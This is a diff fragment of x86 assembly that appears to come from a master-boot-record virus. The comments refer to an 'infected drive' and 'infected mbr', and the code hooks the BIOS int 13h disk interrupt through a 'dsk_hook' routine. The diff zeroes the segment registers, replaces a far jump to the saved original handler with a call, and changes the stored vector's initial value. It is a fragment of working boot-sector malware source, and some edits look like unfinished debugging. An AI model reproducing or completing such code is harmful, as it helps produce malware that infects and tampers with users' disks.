@@ -6,6 +6,9 @@ start:
   cli                         ; no interrupt zone
   mov BYTE [bootDrive], dl    ; save boot drive, this is infected drive
   mov sp, 0xFFF8              ; stack pointer
+  xor ax, ax
+  mov ds, ax
+  mov es, ax
 
                             ; let's save infected mbr to location 0x7e00
   mov al, 0x01              ; load 1 sector
@@ -93,14 +96,15 @@ dsk_hook:
   mov cx, 0x0002
 .end_hook:
   popf
-  jmp far [oldint13-cpy_original+0x7e00]
+  ;mov ax, [cs:oldint13-cpy_original+0x7e00]
+  call [cs:oldint13-cpy_original+0x7e00]
   ;call 0xe3fe
   nop
   ;mov ax, ax
   ret
 
-oldint13
-  dd 0                   ; var for saving int13 address
+oldint13:
+  dd 45                   ; var for saving int13 address
 
 ; write/read sector on disk, based on
 ; ah = 0x02 read, ah = 0x03 write
